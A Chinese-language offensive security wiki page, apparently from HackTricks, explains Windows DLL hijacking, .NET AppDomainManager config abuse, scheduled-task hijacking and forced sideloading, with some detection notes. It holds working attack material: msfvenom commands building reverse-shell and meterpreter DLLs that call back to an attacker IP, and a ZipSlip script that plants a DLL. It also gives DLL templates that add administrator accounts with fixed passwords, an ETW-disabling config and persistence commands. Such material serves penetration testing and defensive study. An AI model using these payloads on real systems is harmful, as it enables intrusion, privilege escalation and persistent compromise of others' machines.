# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本信息

DLL Hijacking 是指诱使受信任的应用程序加载恶意 DLL。这个术语涵盖多种策略，例如 **DLL Spoofing、Injection 和 Side-Loading**。它主要用于执行代码、实现持久化，较少用于权限提升。尽管这里侧重于权限提升，但无论目标是什么，劫持方法都基本一致。

### 常见技术

DLL Hijacking 有多种方法，效果取决于应用程序加载 DLL 的策略：<sup>[[4]](#references)</sup>

1. **DLL Replacement**：用恶意 DLL 替换正版 DLL；也可以使用 DLL Proxying 保留原 DLL 的功能。
2. **DLL Search Order Hijacking**：将恶意 DLL 放在搜索路径中，位置先于正版 DLL，从而利用应用程序的搜索顺序。
3. **Phantom DLL Hijacking**：创建恶意 DLL，让应用程序误以为它是所需的 DLL 并加载它，而该 DLL 原本并不存在。
4. **DLL Redirection**：修改 `%PATH%` 等搜索参数，或修改 `.exe.manifest` / `.exe.local` 文件，将应用程序导向恶意 DLL。
5. **WinSxS DLL Replacement**：在 WinSxS 目录中用恶意 DLL 替换正版 DLL，这种方法通常与 DLL side-loading 有关。
6. **Relative Path DLL Hijacking**：将恶意 DLL 放在用户可控目录中，与复制的应用程序放在一起，类似于 Binary Proxy Execution 技术。

应用程序也可以实现自己的 **DLL loader**。特权进程可能会枚举 `Libraries` 或 `Plugins` 等子目录，并将选定的 DLL 传递给辅助程序，这一过程不依赖常规的 Windows DLL 搜索顺序。如果其他账户能够在该目录中创建文件，可将其作为进一步审查的线索：确认进程身份、目录的有效 ACL、文件选择规则，以及是否存在可触发的加载操作。可写的可执行文件所在目录，并不能证明进程会从该目录加载 DLL。

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### 安装后 PE import grafting

传统的 side-loading 会保留受信任的 PE 不变，并利用 DLL 名称解析过程。**Import grafting** 则会修改受信任程序已加载的 PE。攻击者会为攻击者控制的 DLL 添加一个 import descriptor 及相关的 lookup/IAT 条目。Windows 递归解析该依赖项时，会映射新增的 DLL，并在原本合法的进程中运行其初始化代码。这是对磁盘上的 PE 文件进行修改，与在运行时将 IAT 函数指针替换为 hook 并非同一操作。<sup>[[26]](#references)[[27]](#references)</sup>

被修改的 PE 可以是中间层厂商 DLL，而不一定是用户或 Task Scheduler 启动的可执行文件。一个可复用的链路如下：<sup>[[27]](#references)</sup>

1. 将正版可执行文件及其依赖项复制到攻击者控制的目录。
2. 修改其中一个依赖项的 import 结构，使其引用恶意 DLL，同时保留该依赖项预期的导出项和正常行为。
3. 配置自动运行项或计划任务来启动正版可执行文件。loader 会映射被修改的依赖项，随后加载新导入的 DLL。有关任务枚举，请参见 [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks)。
4. 不要在 `DllMain` 中执行耗时操作；观察到的 loader 会创建一个 worker thread，并在其中继续分阶段解密。

如果厂商的软件包本身是干净的，而 import 修改发生在安装之后，那么这与厂商端的供应链 compromise 不同。对暂存目录中的每个模块进行分类检查，而不只是检查宿主 EXE：将依赖项的 import 列表和哈希与已知良好的安装进行比较，验证签名，并调查从意外的可写位置（例如 `C:\ProgramData`）启动的厂商二进制文件。指向此类目录中复制的 crash reporter 或 updater 的计划任务，是一个特别有用的调查切入点。<sup>[[27]](#references)</sup>


### AppDomainManager hijacking（`<exe>.config` + 攻击者程序集）

Classic DLL sideloading 并非让受信任的 **.NET Framework** 进程加载攻击者代码的唯一方式。如果目标可执行文件是 **managed** 应用程序，CLR 还会查找以可执行文件命名的 **应用程序配置文件**（例如 `Setup.exe.config`）。该文件可以定义自定义的 **AppDomainManager**。如果配置文件指向放在 EXE 旁边、由攻击者控制的程序集，CLR 就会在应用程序的正常代码路径运行前加载该程序集，并在受信任进程中运行其中的代码。<sup>[[24]](#references)</sup>

根据 Microsoft 的 .NET Framework 配置架构，必须同时存在 `<appDomainManagerAssembly>` 和 `<appDomainManagerType>`，才能使用自定义 manager。<sup>[[16]](#references)[[17]](#references)</sup>

最小配置：

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

最简管理器：

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

实用注意事项：
- 这是**特定于 .NET Framework** 的 tradecraft。它依赖 CLR 配置解析，而非 Win32 DLL 搜索顺序。
- 宿主必须是真正的**托管 EXE**。快速 triage：运行 `sigcheck -m target.exe`、`corflags target.exe`，或检查 PE metadata 中是否存在 **CLR Runtime Header**。
- 配置文件名必须与可执行文件名完全匹配（`<binary>.config`），并且通常位于 **EXE 同目录**。
- 这种方法适用于**已签名的 Microsoft/供应商二进制文件**：受信任的 EXE 保持不变，同时恶意托管程序集在进程内执行。
- 如果你已经有可写的安装程序/更新程序目录，可以将 AppDomainManager hijacking 用作**第一阶段**，然后在后续阶段使用传统 DLL sideloading 或 reflective loading。

### AppDomainManager 作为 downloader + scheduled-task bootstrap

一种实用的入侵模式是，将受信任的托管 EXE 与恶意 `*.config` 及恶意 AppDomainManager DLL 配对使用；该 DLL 仅充当一个**小型 bootstrapper**：<sup>[[25]](#references)</sup>

1. 用户从可信的位置（例如 `%USERPROFILE%\Downloads`）启动已签名的 .NET 安装程序或更新程序。
2. 同目录下的配置文件使 CLR 在合法应用逻辑开始前加载攻击者程序集。
3. 恶意 manager 执行 **path gate**（例如，仅当宿主 EXE 从 `Downloads` 运行时才继续，并且只允许第二阶段从 `%LOCALAPPDATA%` 运行）。
4. 如果检查通过，它会将真正的 payload 下载到用户可写路径（例如 `%LOCALAPPDATA%\PerfWatson2.exe`），并通过 scheduled task 建立 persistence。

此变体的重要性：
- 已签名的宿主 EXE 保持不变，因此只对主二进制文件进行 hash 检查的 triage 可能会漏掉这次 compromise。
- 简单的**基于路径的 anti-analysis** 很常见：将 ZIP/EXE/DLL 三件套移到 Desktop、Temp 或 sandbox 路径，可能会有意破坏整个执行链。
- 第一阶段的 AppDomainManager DLL 可以保持小巧、低噪声，而真正的 implant 稍后再下载。

此模式中常见的最简 persistence 示例：

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

备注：
- `/rl highest` 表示该用户/会话可用的**最高权限**；它本身并不保证提升到 SYSTEM。
- 与经典的缺失 DLL 搜索顺序劫持相比，这种技术通常更适合归类为**通过滥用 .NET 配置实现执行/持久化**，尽管操作者经常会将两者串联使用。

检测线索：
- 从 **ZIP 解压路径**、`Downloads`、`%TEMP%` 或其他用户可写目录启动的已签名 .NET 可执行文件，旁边还放置了 `<exe>.config`。
- 新建的计划任务，其操作指向 `%LOCALAPPDATA%`、`%APPDATA%` 或 `Downloads`，且名称仿冒浏览器/供应商更新程序。
- 短暂运行的托管引导进程会立即下载另一个 EXE，然后启动 `schtasks.exe`。
- 如果可执行文件路径与预期的用户配置文件目录不匹配，样本就会提前退出。

### 劫持现有计划任务以重新启动侧载链

进行持久化时，不要只查找**新建任务**。某些入侵组织会等到合法安装程序创建**常规更新任务**后，再**改写任务操作**，使现有名称、作者和触发器在防御人员看来仍然熟悉。

可复用的工作流程：
1. 安装/运行合法软件，并确定它通常会创建哪个任务。
2. 导出任务 XML，并记录当前的 `<Exec><Command>` / `<Arguments>` 值。<sup>[[23]](#references)</sup>
3. 仅替换操作，使任务从用户可写的暂存目录启动你的**可信宿主 EXE**，然后由它侧载或通过 AppDomain 加载真正的 payload。
4. 重新注册同名任务，而不是创建一个明显的新持久化产物。

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

为什么隐蔽性更高：
- 任务名称仍然可以看起来很合法（例如厂商更新程序）。
- 它由 **Task Scheduler 服务**启动，因此父进程/祖先进程验证通常会看到预期的计划任务链，而不是 `explorer.exe`。
- 如果 DFIR 团队只搜寻**新建的任务名称**，可能会漏掉注册信息早已存在、但操作现在指向 `%LOCALAPPDATA%`、`%APPDATA%` 或其他攻击者可控路径的任务。

快速搜寻切入点：
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- 将 `C:\Windows\System32\Tasks\*` XML 和 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` 元数据与基线进行比较。
- 如果一个**看起来像厂商更新程序的任务**从**用户可写目录**执行，或启动带有同目录 `*.config` 文件的 .NET EXE，则触发告警。

> [!TIP]
> 如需了解如何通过 DLL sideloading 结合 HTML staging、AES-CTR 配置和 .NET implant 构建逐步攻击链，请查看以下工作流。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 查找缺失的 DLL

在系统中查找缺失 Dlls 最常见的方法，是运行 Sysinternals 的 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)，并**设置以下 2 个筛选器**：

![常见技术 - 查找缺失的 Dll：在系统中查找缺失的 Dll 最常见的方法，是运行 Sysinternals 的 procmon，并设置以下 2 个筛选器](<../../../images/image (961).png>)

![常见技术 - 查找缺失的 Dll：在系统中查找缺失的 Dll 最常见的方法，是运行 Sysinternals 的 procmon，并设置以下 2 个筛选器](<../../../images/image (230).png>)

然后只显示 **File System Activity**：

![常见技术 - 查找缺失的 Dll：然后只显示 File System Activity](<../../../images/image (153).png>)

如果要查找**一般情况下缺失的 dll**，就让它运行**几秒钟**。\
如果要查找**特定可执行文件中缺失的 DLL**，再设置一个筛选器，例如 **"Process Name" "contains" `<exec name>`**，然后运行该程序并停止捕获事件。<sup>[[9]](#references)</sup>

## 利用缺失的 DLL

要提升权限，请寻找**特权进程尝试从可写位置加载的 DLL**。当你控制的目录在包含合法 DLL 的目录之前被搜索，或者所请求的 DLL 不存在且你可以写入某个被搜索的目录时，就可能出现这种情况。

### DLL 搜索顺序

**在**[**Microsoft 文档**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)**中，可以找到 DLL 的具体加载方式。**

**Windows 应用程序**会遵循一组**预定义的搜索路径**，并按照特定顺序查找 DLL。当恶意 DLL 被策略性地放入其中一个目录，确保它在正版 DLL 之前加载时，就会产生 DLL hijacking 问题。防止这一问题的一种方法，是确保应用程序使用绝对路径引用所需的 DLL。

下面是**32 位**系统上的 **DLL 搜索顺序**：

1. 应用程序加载所在的目录。
2. 系统目录。使用 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 函数获取该目录的路径。(_C:\Windows\System32_)
3. 16 位系统目录。没有函数可以获取该目录的路径，但系统仍会搜索它。(_C:\Windows\System_)
4. Windows 目录。使用 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 函数获取该目录的路径。
   1. (_C:\Windows_)
5. 当前目录。
6. PATH 环境变量中列出的目录。请注意，这不包括 **App Paths** 注册表项指定的每个应用程序路径。计算 DLL 搜索路径时不会使用 **App Paths** 项。

这是启用 **SafeDllSearchMode** 时的**默认**搜索顺序。禁用它时，当前目录会升至第二位。要禁用此功能，请创建 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 注册表值并将其设为 0（默认启用）。

如果调用 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 函数时使用了 **LOAD_WITH_ALTERED_SEARCH_PATH**，搜索会从 **LoadLibraryEx** 正在加载的可执行模块所在目录开始。

最后，可以通过绝对路径而非名称加载 DLL。在这种情况下，Windows 只会在该路径查找 DLL 本身；按名称请求的依赖项仍遵循适用的搜索顺序。

还有其他方法可以改变搜索顺序，但这里不作解释。

### 将任意文件写入串联到缺失 DLL hijack

**相关技术：** [针对特权修复操作，通过 oplock 门控的挂载点切换](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation)。

1. 使用 **ProcMon** 筛选器（`Process Name` = 目标 EXE，`Path` 以 `.dll` 结尾，`Result` = `NAME NOT FOUND`），收集进程尝试查找但未找到的 DLL 名称。<sup>[[14]](#references)</sup>
2. 如果二进制文件按**计划任务/服务**运行，将其中一个名称的 DLL 放入**应用程序目录**（搜索顺序第 #1 项），它就会在下次执行时加载。在一个 .NET 扫描器案例中，进程先在 `C:\samples\app\` 中查找 `hostfxr.dll`，之后才从 `C:\Program Files\dotnet\fxr\...` 加载真正的副本。
3. 构建一个 payload DLL（例如 reverse shell），并导出任意函数：`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`。
4. 如果你的原语是 **ZipSlip 式任意写入**，就构造一个 ZIP，使其中的条目逃逸出解压目录，从而将 DLL 写入应用程序文件夹：

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. 将归档文件放入受监控的收件箱/共享目录；计划任务重新启动进程时，该进程会加载恶意 DLL，并以服务账户身份执行你的代码。

### 通过 RTL_USER_PROCESS_PARAMETERS.DllPath 强制 sideloading

一种高级方法是：创建新进程时，使用 ntdll 的原生 API 设置 RTL_USER_PROCESS_PARAMETERS 中的 DllPath 字段，从而确定性地影响 DLL 搜索路径。通过在此处提供攻击者控制的目录，如果目标进程按名称解析导入的 DLL（未使用绝对路径，也未使用安全加载标志），就可以强制它从该目录加载恶意 DLL。

核心思路
- 使用 RtlCreateProcessParametersEx 构建进程参数，并提供指向你控制的文件夹的自定义 DllPath（例如，存放 dropper/unpacker 的目录）。
- 使用 RtlCreateUserProcess 创建进程。当目标二进制文件按名称解析 DLL 时，加载器会在解析过程中查询此处提供的 DllPath，从而实现可靠的 sideloading，即使恶意 DLL 与目标 EXE 不在同一目录中。

注意事项/限制
- 这会影响正在创建的子进程；这与仅影响当前进程的 SetDllDirectory 不同。
- 目标必须按名称导入或调用 LoadLibrary 加载 DLL（未使用绝对路径，也未使用 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）。
- KnownDLLs 和硬编码的绝对路径无法被劫持。转发导出和 SxS 可能会改变优先级。

最简 C 示例（ntdll、宽字符串、简化的错误处理）：

<details>
<summary>完整 C 示例：通过 RTL_USER_PROCESS_PARAMETERS.DllPath 强制 DLL sideloading</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

实际使用示例
- 在你的 DllPath 目录中放置恶意 xmllite.dll（导出所需函数或代理到真实 DLL）。
- 使用上述技术启动一个已知会按名称查找 xmllite.dll 的签名二进制文件。加载器通过提供的 DllPath 解析导入项，并侧加载你的 DLL。

据观察，此技术曾在真实攻击中用于驱动多阶段侧加载链：初始启动器释放一个辅助 DLL，随后该 DLL 启动一个由 Microsoft 签名、可被劫持的二进制文件，并为其设置自定义 DllPath，以强制从暂存目录加载攻击者的 DLL。<sup>[[6]](#references)</sup>


### 通过 `.exe.config` 进行 .NET AppDomainManager hijacking

对于 **.NET Framework** 目标，可以滥用应用程序旁边的 **`.exe.config`** 文件，在不修补内存的情况下，于 **`Main()` 之前**执行侧加载。攻击者不再仅依赖 Win32 DLL 搜索顺序，而是将合法的 .NET EXE 与恶意配置文件以及一个或多个攻击者控制的程序集放在一起。

工作流程如下：<sup>[[15]](#references)[[22]](#references)</sup>
1. 宿主 EXE 启动，**CLR 读取 `<exe>.config`**。
2. 配置设置 **`<appDomainManagerAssembly>`** 和 **`<appDomainManagerType>`**，使运行时实例化攻击者控制的 `AppDomainManager`。
3. 恶意管理器在受信任的宿主进程中获得 **`Main()` 前执行**的机会。
4. 同一配置可以强制 CLR 优先解析本地程序集（例如 `InitInstall.dll`、`Updater.dll`、`uevmonitor.dll`），并在不进行内联修补的情况下削弱运行时验证/遥测。

类似攻击活动中的模式（具体嵌套方式可能因指令/CLR 版本而异）：

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

为何有用：
- **`<probing privatePath="."/>`** 将程序集解析限制在应用程序目录中，使该文件夹成为可预测的 sideloading 攻击面。<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** 在 CLR 初始化期间、合法应用逻辑运行之前，将执行转移到攻击者代码中。<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** 可让完全信任的应用加载未签名或遭篡改的程序集，而不会因 strong-name 验证失败。<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** 可避免 publisher-policy 将程序集重定向到更新版本。<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** 可让运行时选择更加确定。<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** 尤其值得关注，因为 **CLR 会通过配置禁用自身的 ETW 可见性**，而不是由 implant 在内存中修补 `EtwEventWrite`。

近期活动中观察到的操作模式：
- 阶段 1：放置 `setup.exe`、`setup.exe.config` 和本地程序集。
- 阶段 2：将它们复制到看似可信的 **AppData 更新**文件夹，将宿主重命名为类似 `update.exe` 的名称，然后通过**计划任务**重新启动。
- 阶段 3：在加载最终的 RAT DLL/export 之前验证执行上下文（例如，预期的父进程是来自 Task Scheduler 的 `svchost.exe`）。

狩猎思路：
- 位于用户可写位置、带有可疑相邻 **`.config`** 文件的已签名或其他合法 **.NET 可执行文件**。
- 含有 **`appDomainManagerAssembly`**、**`appDomainManagerType`**、**`probing privatePath="."`**、**`bypassTrustedAppStrongNames`** 或 **`etwEnable enabled="false"`** 的 `.config` 文件。
- 从 **`%LOCALAPPDATA%`** 或应用专用的 `\bin\update\` 目录重新启动已重命名更新程序的计划任务。
- 计划任务启动受信任的 .NET 宿主后，该宿主立即从自身目录加载非供应商程序集的父子进程链。

#### Windows 文档中 DLL 搜索顺序的例外情况

Windows 文档中提到了标准 DLL 搜索顺序的某些例外情况：

- 遇到一个**与内存中已加载的 DLL 同名的 DLL** 时，系统会绕过通常的搜索流程，而是先检查重定向和清单，然后默认使用内存中已加载的 DLL。**在这种情况下，系统不会搜索该 DLL**。
- 如果 DLL 被识别为当前 Windows 版本的**已知 DLL**，系统会使用该已知 DLL 的版本及其所有依赖 DLL，**跳过搜索流程**。注册表项 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** 保存了这些已知 DLL 的列表。
- 如果某个 **DLL 有依赖项**，系统会按其**模块名**搜索这些依赖 DLL，不论最初的 DLL 是否通过完整路径找到。

### 提升权限

**要求**：

- 找到一个在**不同权限**下运行或将要运行的进程（横向或侧向移动），且该进程**缺少某个 DLL**。
- 确保对搜索 **DLL** 的任意**目录**拥有**写入权限**。该位置可能是可执行文件所在目录，也可能是系统路径中的目录。

默认情况下，这些条件并不常见：特权可执行文件通常不会缺少 DLL 依赖项，而标准用户通常无法写入系统搜索路径目录。不过，配置错误的环境仍可能同时暴露这两种情况。\
如果满足这些要求，请查看 [UACME](https://github.com/hfiref0x/UACME) 项目。虽然它的主要目标是 UAC bypass，但其中包含适用于特定 Windows 版本的 DLL-hijacking PoC，通常可以改编用于你找到的可写目录。

请注意，你可以通过以下方式**检查自己对文件夹的权限**：<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

并**检查 PATH 中所有文件夹的权限**：

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

你还可以使用以下方式检查可执行文件的导入项和 DLL 的导出项：

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

要查看关于如何利用 **DLL Hijacking 提升权限**（需要具有对 **System Path 文件夹**的写入权限）的完整指南，请查看：

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自动化工具

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)会检查你是否对 System PATH 中的任意文件夹具有写入权限。\
其他用于发现此漏洞的有用自动化工具包括 **PowerSploit functions**：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_ 和 _Write-HijackDll_。

### 示例

如果你发现了可利用的场景，要成功利用它，最重要的事情之一就是**创建一个至少导出可执行文件会从中导入的所有函数的 dll**。无论如何，请注意，DLL Hijacking 可用于[从 Medium Integrity level 提升到 High **（绕过 UAC）**](../../authentication-credentials-uac-and-efs/index.html#uac)，或[从 **High Integrity 提升到 SYSTEM**](../index.html#from-high-integrity-to-system)**。**你可以在这篇专注于通过 DLL hijacking 实现执行的研究文章中找到一个关于**如何创建有效 dll**的示例：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
此外，在**下一节**中，你可以找到一些可能适合作为**模板**或用于创建**导出非必需函数的 dll**的**基础 dll 代码**。

## **创建和编译 DLL**

### **DLL 代理**

基本上，**DLL proxy** 是一种 DLL，它能够在**加载时执行你的恶意代码**，同时也能**公开**相关功能并按**预期方式运行**，方法是将所有调用**转发给真实库**。

使用 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 或 [**Spartacus**](https://github.com/Accenture/Spartacus)，你可以**指定一个可执行文件并选择要代理的库**，然后**生成代理 DLL**；或者**指定 DLL**，再**生成代理 DLL**。

### **Meterpreter**

**获取反向 shell（x64）：**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**获取一个 meterpreter (x86)：**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**创建一个用户（x86，我没看到 x64 版本）：**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### 自定义

在许多情况下，你编译的 DLL 必须**导出受害进程导入的每个函数**。如果缺少某个必需的导出函数，二进制文件就无法解析该函数，导致 exploit 失败。

<details>
<summary>C DLL 模板（Win10）</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>创建用户的 C++ DLL 示例</summary>

</final>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>带线程入口的备用 C DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## 案例研究：Narrator OneCore TTS 本地化 DLL 劫持（辅助功能/ATs）

Windows Narrator.exe 启动时仍会探测一个可预测、特定语言的本地化 DLL，该 DLL 可被劫持以实现任意代码执行和持久化。<sup>[[7]](#references)</sup>

关键事实
- 探测路径（当前版本）：`%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll`（EN-US）。
- 旧版路径（较旧版本）：`%windir%\System32\speech\engine\tts\msttslocenus.dll`。
- 如果 OneCore 路径下存在攻击者可控且可写的 DLL，该 DLL 就会被加载，并执行 `DllMain(DLL_PROCESS_ATTACH)`。不需要任何导出函数。

使用 Procmon 进行发现
- 筛选条件：`Process Name is Narrator.exe` 和 `Operation is Load Image` 或 `CreateFile`。
- 启动 Narrator，并观察对上述路径的加载尝试。

最小 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC 静默
- 朴素的 hijack 会发声/突出显示 UI。要保持静默，在 attach 时枚举 Narrator 线程，打开主线程（`OpenThread(THREAD_SUSPEND_RESUME)`）并对其调用 `SuspendThread`；然后在你自己的线程中继续执行。完整代码见 PoC。<sup>[[8]](#references)</sup>

通过 Accessibility 配置触发和持久化
- 用户上下文（HKCU）：`reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
